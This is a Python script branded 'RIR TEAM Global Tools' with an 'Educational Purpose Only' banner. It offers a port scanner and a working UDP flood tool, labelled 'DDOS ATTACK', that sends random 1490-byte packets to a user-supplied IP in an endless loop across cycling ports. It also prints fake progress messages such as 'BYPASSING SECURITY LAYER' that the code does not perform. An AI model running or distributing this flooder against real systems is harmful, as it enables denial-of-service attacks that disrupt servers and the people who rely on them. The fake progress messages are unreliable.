#!/usr/bin/env python
# -*- coding: utf-8 -*-

print ("\033[92m")
import sys
import os
import time
import socket
import random
import urllib2
import re
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

def show_header():
    os.system("clear")
    print("\033[1;36m")
    print("┌────────────────────────────────────────┐")
    print("│  ██████╗ ██████╗                       │")
    print("│  ██╔══██╗██╔══██╗                      │")
    print("│  ██████╔╝██████╔╝                      │")
    print("│  ██╔══██╗██╔══██╗                      │")
    print("│  ██║  ██║██║  ██║                      │")
    print("│  ╚═╝  ╚═╝╚═╝  ╚═╝                      │")
    print("│                                        │")
    print("│       🚀 RIR TEAM 🚀                    │")
    print("│    Global Tools v3.0                    │")
    print("└────────────────────────────────────────┘")
    print("\033[0m")
    print("\033[93m")
    print("  🔥 WELCOME TO RIR TEAM TOOLS 🔥")
    print("\033[0m")
    print("\033[91m")
    print("  [!] Educational Purpose Only [!]")
    print("\033[0m")

def scan_ports(ip):
    print("\033[94m")
    print("──────────────────────────────────────────")
    print("  🔍 SCANNING OPEN PORTS")
    print("──────────────────────────────────────────")
    print("\033[0m")
    
    open_ports = []
    common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
    
    print("\033[93m[+] Scanning common ports...\033[0m")
    
    for port in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
                print("\033[92m[+] Port %s is OPEN\033[0m" % port)
            sock.close()
        except:
            pass
    
    return open_ports

def get_ip_from_url():
    show_header()
    print("\033[94m")
    print("──────────────────────────────────────────")
    print("  🌐 GET IP FROM WEBSITE")
    print("──────────────────────────────────────────")
    print("\033[0m")
    url = raw_input("\033[1;37m[?] Enter URL (http/https): \033[0m")
    
    try:
        domain = re.sub(r'^https?://', '', url)
        domain = domain.split('/')[0]
        
        print("\n\033[93m[+] Resolving IP...\033[0m")
        time.sleep(2)
        
        ip_addr = socket.gethostbyname(domain)
        
        print("\n\033[92m[+] IP Found!\033[0m")
        print("\033[1;36m")
        print("┌────────────────────────────────────────┐")
        print("│         IP INFORMATION                 │")
        print("├────────────────────────────────────────┤")
        print("│  Website : " + domain.ljust(23) + "│")
        print("│  IP      : " + ip_addr.ljust(23) + "│")
        print("└────────────────────────────────────────┘")
        print("\033[0m")
        
        # Scan for open ports
        open_ports = scan_ports(ip_addr)
        
        if open_ports:
            print("\033[1;36m")
            print("┌────────────────────────────────────────┐")
            print("│         OPEN PORTS FOUND               │")
            print("├────────────────────────────────────────┤")
            for port in open_ports:
                print("│  Port " + str(port).ljust(6) + " : OPEN" + " " * 17 + "│")
            print("└────────────────────────────────────────┘")
            print("\033[0m")
        else:
            print("\033[91m[!] No open ports found!\033[0m")
        
        raw_input("\n\033[1;37m[Press ENTER to return]\033[0m")
        
    except socket.gaierror:
        print("\033[91m[!] Invalid Domain!\033[0m")
        time.sleep(2)
    except Exception as e:
        print("\033[91m[!] Error: " + str(e) + "\033[0m")
        time.sleep(2)

def ddos_attack():
    show_header()
    print("\033[94m")
    print("──────────────────────────────────────────")
    print("  💥 DDOS ATTACK SYSTEM")
    print("──────────────────────────────────────────")
    print("\033[0m")
    
    ip = raw_input("\033[1;37m[?] IP Target : \033[0m")
    port = input("\033[1;37m[?] Port      : \033[0m")
    
    show_header()
    print("\033[92m")
    print("[+] TRYING TO REACH THE SERVER...")
    time.sleep(5)
    print("[+] ESTABLISHING CONNECTION...")
    time.sleep(5)
    print("[+] BYPASSING SECURITY LAYER...")
    time.sleep(5)
    print("[+] CONNECTION ESTABLISHED!")
    time.sleep(5)
    print("[!] DDOS ATTACK STARTED [!]")
    time.sleep(3)
    
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print("\033[1;32m[+] Sent %s packet to %s through port:%s\033[0m" % (sent, ip, port))
        if port == 65534:
            port = 1

# ============= MAIN MENU =============
while True:
    show_header()
    print("\033[1;37m")
    print("┌────────────────────────────────────────┐")
    print("│            MAIN MENU                   │")
    print("├────────────────────────────────────────┤")
    print("│  [1]  🌐 GET IP FROM URL               │")
    print("│  [2]  💥 DDOS ATTACK                   │")
    print("│  [3]  🚪 EXIT                         │")
    print("└────────────────────────────────────────┘")
    print("\033[0m")
    
    choice = raw_input("\033[1;33m[?] Choose (1/2/3): \033[0m")
    
    if choice == '1':
        get_ip_from_url()
    elif choice == '2':
        ddos_attack()
    elif choice == '3':
        print("\033[92m\n[+] Thanks for using RIR TEAM! Goodbye!\033[0m")
        sys.exit()
    else:
        print("\033[91m[!] Invalid choice! Try again.\033[0m")
        time.sleep(2)